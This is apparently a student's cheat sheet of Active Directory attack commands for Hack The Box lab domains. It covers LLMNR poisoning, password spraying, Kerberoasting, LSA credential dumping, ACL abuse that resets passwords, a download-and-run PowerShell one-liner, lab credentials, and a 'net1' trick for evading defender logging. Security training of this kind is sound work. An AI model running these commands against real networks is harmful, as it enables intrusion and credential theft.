# Initial Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nslookup ns1.inlanefreight.com`| Query the DNS and discover the IP address to domain name mapping of the target entered|
| `sudo tcpdump -i ens224 -v`  | Start capturing network packets on the network interface|
| `sudo responder -I ens224 -A -v`   | Start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries |
| `fping -asgq 172.16.5.0/23`  | Performs a ping sweep |
| `sudo nmap -v -A -iL hosts.txt -oN output.txt` |nmap scanning|
| `./kerbrute_linux userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Enumerating users with kerbrute |
| `crackmapexec smb 172.16.5.5 --users`  | Uses `CrackMapExec` to discover users in a target Windows domain |
| `crackmapexec smb 10.10.11.35 -u "guest" -p "" --rid-brute \| grep "SidTypeUser"` | brute force rid to enum users |
| `enum4linux-ng -A 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'` | enum AD related things |
| `nxc ldap administrator.htb -d administrator.htb -u Olivia -p ichliebedich --dns-server 10.10.11.42 --bloodhound -c All` | bloodhound-python alternative |

> administrator, guest, krbtgt, domain admins, root , are some common default SMB names
> In bloodhound , it's important to check object control

```
crackmapexec smb -u ‘AB920’ -p ‘weasal’ 172.16.7.3 --users > DomainUser.txt
cat DomainUser.txt | awk ‘{print $5}’ | sed ‘s/^.*\\//’ | sort -u > SortedDomainUser.txt
```


# LLMNR/NTB-NS Poisoning 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `responder -h` | Used to display the usage|
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` |Cracking NTLMv2 |
| `Import-Module .\Inveigh.ps1`| Import Inveigh |
| `(Get-Command Invoke-Inveigh).Parameters` | List all possible parameters |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts Inveigh with LLMNR & NBNS spoofing|
| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh`. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |



# Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses CrackMapExec and valid creds to enumerate the password policy |
| `rpcclient -U "" -N 172.16.5.5`                              | rpcclient to connect the domain through `SMB NULL` sessions |
| `rpcclient $> querydominfo; getdompwinfo`  | to obtain information about the domain and password policy |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy in a target Windows domain, the output in YAML & JSON |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain |
| `Import-Module .\PowerView.ps1; Get-DomainPolicy` | Used to enumerate the password policy in a target Windows domain |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain |
| `rpcclient -U "" -N 172.16.5.5;  rpcclient $> enumdomuser`    | Uses `rpcclient` to discover user accounts in a target Windows domain |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows domain, then filters the output to show only the `sAMAccountName` |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` to perform a password spraying attack against a target Windows domain |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` to perform a password spraying attack against a target Windows domain |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Validating the creds with CrackMapExec |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Local Admin Spraying with CrackMapExec |
| `Import-Module .\DomainPasswordSpray.ps1` | Used to import the PowerShell-based |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs the results |

# Enumerating Security Controls

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-MpComputerStatus`    | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode`  | Enumerating `PowerShell Language Mode` |
| `Find-LAPSDelegatedGroups`      | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |
| `Find-AdmPwdExtendedRights`      | checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights` |
| `Get-LAPSComputers`      | Searches for computers that have LAPS enabled, discover `expiration` / `randomized` passwords |



# Credentialed Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid creds |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates over `smb` using valid creds and attempts to discover `users` in a target Windows domain |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates over `smb` using valid creds and attempts to discover `groups` in a target Windows domain |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates over `smb` using valid creds and attempts to check for a list of `logged on users` on the target Windows host |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates `smb` using valid creds and attempts to discover any smb shares |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Utilizes the module to go through each readable share (`Dev-share`) and list all readable files. The output in `JSON` |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| ` rpcclient $> queryuser 0x457`                              | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers`                                  | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  ` | Impacket tool used to connect to the `CLI`  of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  ` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h`                                         | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`)  as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |
| `crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa` | crackmapexec dump cred from lsa |

# Enumeration by Living Off the Land

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
| `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name`                        | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"`                   | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"`             | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV`                                        | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |
| `ConvertTo-SID`                                              | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |
| `Get-DomainSPNTicket`                                        | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |
| `Get-Domain`                                                 | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController`                                       | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser`                                             | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer`                                         | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup`                                            | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU`                                               | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl`                                  | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember`                                      | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer`                                       | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare`                                         | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO`                                              | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy`                                           | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup`                                          | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember`                                    | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare`                                               | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession`                                             | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess`                                           | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation`                                    | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare`                                           | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile`                            | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess`                                      | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |
| `Get-DomainTrust`                                            | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust`                                            | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser`                                      | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember`                               | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`   | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |
| `.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`          | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

# Transfering Files

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m http.server 8001`                           | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |



# Kerberoasting 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |
| `setspn.exe -Q */*`                                          | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host. |
| `mimikatz # base64 /out:true`                                | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |
| `kerberos::list /export `                                    | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \|  tr -d \\n `                         | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                 | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi`                       | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |
| `cat sqldev_tgs_hashcat `                                    | Used to view the prepared hash from a Linux-based host.      |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt ` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |
| `Import-Module .\PowerView.ps1;  Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv`                                    | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe`                                               | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats`                             | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |

> We can use `Rubeus` with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

> Note: This does not work against a `Windows Server 2019 Domain Controller`, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.



# ACL Enumeration & Tactics 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module .\PowerView.ps1;  $sid = Convert-NameToSid wley` | Retrieve the SID of a specific user account (`wley`) |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Find Windows domain objects that the user has rights over|
| `$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid} ` | Find Windows domain objects that the user has rights over with GUID  |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) ` | Used to create a `PSCredential Object` from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Used to create a `SecureString Object` from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |
| `ConvertFrom-SddlString`                                     | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host. |

![](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)

# Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.


# Dsquery

Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.

## Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `dsquery user`                                               | user search                                                  |
| `dsquery computer`                                           | computer search                                              |
| `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`             | Wildcard Search                                              |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`        |        Users With Specific Attributes Set (PASSWD_NOTREQD)        |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`        |        Searching for Domain Controllers        |



> We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.

```
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

# LDAP Filtering Explained

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803`: Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).
`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

## UAC Values

![](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

## OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

    1.2.840.113556.1.4.803

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

    1.2.840.113556.1.4.804

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

    1.2.840.113556.1.4.1941

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

## Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

We have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, `Kerberoasting`.


# HTB Practice
```
PS C:\tools> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr samaccountname description
>>
  samaccountname          description
  guest                   Built-in account for guest access to the computer/domain
  krbtgt                  Key Distribution Center Service Account
  bross                   HTB{LD@P_I$_W1ld}
  $725000-9jb50uejje9f
  sm_752cbd23e73649258
  sm_8b3ff26494d94da89
  sm_434e56f7c43f4534a
  sm_51dc5f77b78546d7b
  sm_c6ccf50003bf4310b
  sm_c7c8c6f5727449fbb
  sm_925f7acdff9344408
  sm_820598b3d6c548a08
  sm_8f47aca8186c4f0da
```


# DCSync 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
